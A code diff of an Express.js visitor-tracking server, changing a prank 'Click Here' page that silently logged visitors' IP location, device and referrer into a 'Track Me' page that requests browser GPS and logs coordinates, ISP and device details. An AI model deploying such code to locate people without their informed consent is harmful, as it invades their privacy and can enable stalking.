@@ -15,55 +15,61 @@ function getClientIp(req) {
         req.socket.remoteAddress ||
         "Unknown";
 
-    // Remove IPv6 prefix ::ffff:
-    if (ip.startsWith("::ffff:")) {
-        ip = ip.replace("::ffff:", "");
-    }
+    if (ip.startsWith("::ffff:")) ip = ip.replace("::ffff:", "");
 
-    // Ignore local/private IPs → use fallback external IP
     const privateRanges = ["10.", "192.168", "172.16", "172.20", "172.30", "127."];
-    if (privateRanges.some((p) => ip.startsWith(p))) {
-        ip = "8.8.8.8"; // fallback to show location
-    }
+    if (privateRanges.some((p) => ip.startsWith(p))) ip = "8.8.8.8";
 
     return ip;
 }
 
-// 🏠 Home Page with Button
+// Home
 app.get("/", (req, res) => {
     res.send(`
-        <div style="text-align:center; margin-top:50px; font-family:sans-serif;">
-            <h2>Onume illa… kilichipōdu 😄</h2>
-            <button 
-                onclick="window.location.href='/track'" 
-                style="
-                    padding: 12px 20px;
-                    background-color: #007bff;
-                    color: white;
-                    border: none;
-                    border-radius: 8px;
-                    font-size: 18px;
-                    cursor: pointer;
-                    margin-top: 20px;
-                ">
-                Click Here
+        <h2 style="text-align:center">Allow GPS to Track Location</h2>
+        <div style="text-align:center; margin-top:40px;">
+            <button onclick="getLocation()" 
+                style="padding:12px 20px; font-size:18px; background:#007bff; color:white; border:none; border-radius:8px;">
+                Track Me
             </button>
         </div>
+
+        <script>
+        function getLocation() {
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((pos) => {
+                    fetch("/track", {
+                        method: "POST",
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude
+                        })
+                    });
+                });
+            } else {
+                alert("Geolocation not supported!");
+            }
+        }
+        </script>
     `);
 });
 
-// 🎯 Tracking Route
-app.get("/track", async (req, res) => {
+// 📍 Track Route (GPS + IP + ISP)
+app.post("/track", async (req, res) => {
     try {
         const ip = getClientIp(req);
         const ua = useragent.parse(req.headers["user-agent"]);
 
-        // Get Geo Location
+        const gpsLat = req.body.latitude || null;
+        const gpsLon = req.body.longitude || null;
+
+        // IP-based location
         let geo = {};
         try {
-            const response = await axios.get(`http://ip-api.com/json/${ip}`);
-            geo = response.data;
-        } catch (err) {
+            const ipRes = await axios.get(`http://ip-api.com/json/${ip}`);
+            geo = ipRes.data;
+        } catch {
             geo = {};
         }
 
@@ -73,29 +79,24 @@ app.get("/track", async (req, res) => {
             region: geo.regionName || "Unknown",
             country: geo.country || "Unknown",
             isp: geo.isp || "Unknown",
-            timezone: geo.timezone || "Unknown",
+
+            // GPS (High accuracy)
+            gpsLatitude: gpsLat,
+            gpsLongitude: gpsLon,
 
             device: ua.device.toString(),
             os: ua.os.toString(),
             browser: ua.toAgent(),
-
-            referrer: req.headers.referer || "Direct",
             visitedAt: new Date().toISOString(),
         };
 
         console.log("🔥 New Visitor:", data);
 
-        res.send(`
-            <div style="text-align:center; margin-top:50px; font-family:sans-serif;">
-                <h3>Nalla vandhutingale 😄</h3>
-            </div>
-        `);
+        res.json({ status: "success", received: data });
     } catch (err) {
         console.log("Error:", err);
-        res.send("<h3>Error occurred</h3>");
+        res.json({ error: "Tracking failed" });
     }
 });
 
-app.listen(3000, () => {
-    console.log("Tracking server running on port 3000");
-});
+app.listen(3000, () => console.log("Server running on port 3000"));
